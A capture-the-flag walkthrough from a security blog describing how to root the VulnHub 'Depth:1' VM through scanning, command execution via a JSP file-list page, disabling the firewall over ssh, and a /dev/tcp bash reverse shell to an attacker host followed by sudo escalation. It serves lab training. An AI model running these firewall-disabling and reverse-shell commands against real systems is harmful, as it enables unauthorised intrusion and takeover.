<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Depth VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-depth-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-11-29T09:58:42+00:00">November 29, 2017</time><time class="updated" datetime="2025-06-10T20:29:56+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to take on a simple boot2root style VM challenge “Depth:1” by ‘Dan Lawson’. Here we have to root the server to complete the challenge.</span></p>
<p><span style="color: #000000;">Download it from <a href="https://www.vulnhub.com/entry/depth-1,213/"><strong>here</strong></a></span></p>
<p><span style="color: #000000;"><strong>Difficulty</strong>: Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">NMAP</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Web Directory search </span></li>
<li><span style="color: #000000;">Credential harvesting</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Disable firewall through ssh</span></li>
<li><span style="color: #000000;">Payload execution</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Exploit sudo rights</span></li>
</ul>
<p><span style="color: #000000;"><strong>Capture the Flag</strong></span></p>
<h3><span style="color: #800000;"><strong><u>Walkthrough</u></strong></span></h3>
<h3><span style="color: #800000;"><strong>Scanning</strong></span></h3>
<p><span style="color: #000000;">Let’s start off by scanning the network and identifying host IPs. We can identify our host IP as 192.168.1.101 with the help of netdiscover. Next, port enumeration using nmap aggressive scan shows that port 8080 is open and is running http service of Apache Tomcat/Coyote JSP engine 1.1.</span></p>
<pre class="lang:default decode:true">netdiscover
nmap -A 192.168.1.101</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-lSLwIPpkVSU/XOu1YGRMkxI/AAAAAAAAeik/xeWjkYqk67M6M7o9y9_mVYcfZFeZGSUkQCLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">We opened the IP into browser with port 8080. This gives a bit of useful information exposing the default Apache Tomcat’s directories.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-0eTA3KUHCcg/XOu1Zo-tU1I/AAAAAAAAeiw/an0vLfBLNjAEzmuwt9cmW8EO8lvi3UvagCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;"> Next, we are extracting the directories of jsp extension over the target, for that we can use the -X parameter of the dirb scan. Nikto result too shows the same file as you can see in the following screenshot:</span></p>
<pre class="lang:default decode:true">dirb //192.168.1.101:8080/ -X .jsp
nikto -h  //192.168.1.101:8080/</pre>
<p><strong style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Yo2Y0FJ1Jt8/XOu1aHVrNeI/AAAAAAAAei0/Z6LvM3tgpxYwkMnsYjk2wXYqWK150uWOwCLcBGAs/s1600/3.png"/></strong></p>
<p><span style="color: #000000;">While opening the file in the browser shows a <strong>file list checker</strong> script as a hint, which is supposed to list directories from the server upon request.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-rYaPiS_kYDo/XOu1au_TUoI/AAAAAAAAei4/Yx3b567LQy4IsGcF3S1tAZjGpa9F44vTQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Upon executing the given script “ls-l/temp”, we can see user root and tomcat8 is there.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-37bJSQqxtzk/XOu1azc9W9I/AAAAAAAAei8/xvclBeCtZ9QvLZQaeCYLcZ3wt0lRW4ifgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">After trying few more scripts we get success by using ‘ls-l/home’ as  it shows us a user name bill.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-eNnbLVAlqY4/XOu1bPjGTAI/AAAAAAAAejA/r3yVc9OsXqERfhkcccaDTlR8ky0BeQOrwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Here trying to find out running processes with <strong>“ps aux</strong> “, the options “<strong>aux</strong>” prints all the running process in the system regardless of where they have been executed. And we find out that sshd service is in use but maybe with restricted access.</span></p>
<h3><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Me7zE3ddpYc/XOu1bdmoGCI/AAAAAAAAejE/G4Xq1ccK3sQtynT-VuDhmO3b8DixKCe7gCLcBGAs/s1600/7.png"/></span><br/>
<span style="color: #800000;"><strong>Exploiting</strong></span></h3>
<p><span style="color: #000000;">let’s try to disable the firewall through ssh using user bill and it gets executed.</span></p>
<pre class="lang:default decode:true">ssh bill@localhost sudo ufw disable</pre>
<p><span style="color: #000000;">After that to gain reverse shell we first setup our netcat listener on port 1234 which you can see in the last screenshot.</span></p>
<p><span style="color: #000000;">Then we are using bash reverse shell to gain access on host 192.168.1.110 on port 1234.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.110 lport=1234 R</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-B7IdYn8hZXM/XOu1YGWZ-HI/AAAAAAAAeig/TXLLzoxZl4klaWM0Nu9WNdw3UONnD7WFQCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Copy the payload generated and execute it with ssh.</span></p>
<pre class="lang:default decode:true">ssh bill@localhost 0&lt;&amp;46-;exec 46&lt;&gt;/dev/tcp/192.168.1.110/1234;sh &lt;&amp;46 &gt;&amp;46 2&gt;&amp;46</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-gvNRhOdgGyI/XOu1ZOm_dyI/AAAAAAAAeio/hzJhGpSLbzcJzrAh3a8q9SzVNeHWLsotACLcBGAs/s1600/13.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation and Capturing the flag</strong></span></h3>
<p><span style="color: #000000;">As soon as we execute the payload, we get our reverse shell, now we just check sudo rights for the bill and find that he has all permissions as well as he can login without any password. Great!  Now we just have to login and get into root folder. Here we get a file called flag.</span></p>
<p><span style="color: #000000;">Lastly, we open the flag file and capture the flag.</span></p>
<pre class="lang:default decode:true ">nc -lvp 1234
sudo -l
sudo su
cd /root
ls
cat flag</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-7_TEfHgSQXo/XOu1ZVPO2UI/AAAAAAAAeis/YwClaJj6HoclxGx6czy1YM8_kelOWbd7gCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Nisha Yadav is trained in Certified Ethical hacking and Bug Bounty Hunter. She is currently working at Ignite Technologies as a Security Analyst. Connect with her <a style="color: #000000;" href="//www.linkedin.com/in/nisha-yadav-90816120/"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
